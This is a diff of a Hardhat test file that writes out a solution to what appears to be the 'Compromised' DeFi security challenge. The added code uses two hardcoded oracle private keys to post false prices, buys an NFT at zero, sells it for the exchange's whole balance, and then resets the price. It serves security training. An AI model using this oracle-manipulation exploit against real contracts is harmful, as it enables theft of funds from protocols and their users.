@@ -1,4 +1,5 @@
 const { expect } = require('chai');
+const { utils } = require('ethers');
 const { ethers } = require('hardhat');
 
 describe('Compromised challenge', function () {
@@ -61,6 +62,54 @@ describe('Compromised challenge', function () {
 
     it('Exploit', async function () {        
         /** CODE YOUR EXPLOIT HERE */
+        // initialize source wallets from private keys
+        var source2_private_key = "0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9";
+
+        var source3_private_key = "0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48";
+
+        var source2_wallet = new ethers.Wallet(source2_private_key, ethers.provider);
+
+        var source3_wallet = new ethers.Wallet(source3_private_key, ethers.provider);
+
+        // manipulate the Oracles make it cost too little
+        await this.oracle.connect(source2_wallet).postPrice(this.nftToken.symbol(), ethers.utils.parseEther('0.0'));
+        await this.oracle.connect(source3_wallet).postPrice(this.nftToken.symbol(), ethers.utils.parseEther('0.0'));
+
+        // Attacker is too broke, give it 2ETH
+        await source2_wallet.sendTransaction({
+            to: attacker.address,
+            value: utils.parseEther("1.0")
+        });
+        await source3_wallet.sendTransaction({
+            to: attacker.address,
+            value: utils.parseEther("1.0")
+        });
+
+        // BuyOne as attacker
+        const options = {value: ethers.utils.parseEther("0.1")};
+        var tx = await this.exchange.connect(attacker).buyOne(options);
+        var receipt = await tx.wait()
+        //var tokenId, by, price;
+        for (const event of receipt.events) {
+            if (event.event == "TokenBought"){
+                var {by,tokenId,price} = event.args;
+            }
+          }
+
+
+        // manipulate the Oracles make it cost everything
+        // including what was paid to buyone
+        await this.oracle.connect(source2_wallet).postPrice(this.nftToken.symbol(), ethers.utils.parseEther('9990'));
+        await this.oracle.connect(source3_wallet).postPrice(this.nftToken.symbol(), ethers.utils.parseEther('9990'));
+
+        // SellOne as attacker
+        await this.nftToken.connect(attacker).approve(this.exchange.address, tokenId);
+        var tx = await this.exchange.connect(attacker).sellOne(tokenId);
+
+        // manipulate the Oracles make it original everything
+        await this.oracle.connect(source2_wallet).postPrice(this.nftToken.symbol(), ethers.utils.parseEther('999'));
+        await this.oracle.connect(source3_wallet).postPrice(this.nftToken.symbol(), ethers.utils.parseEther('999'));
+
     });
 
     after(async function () {
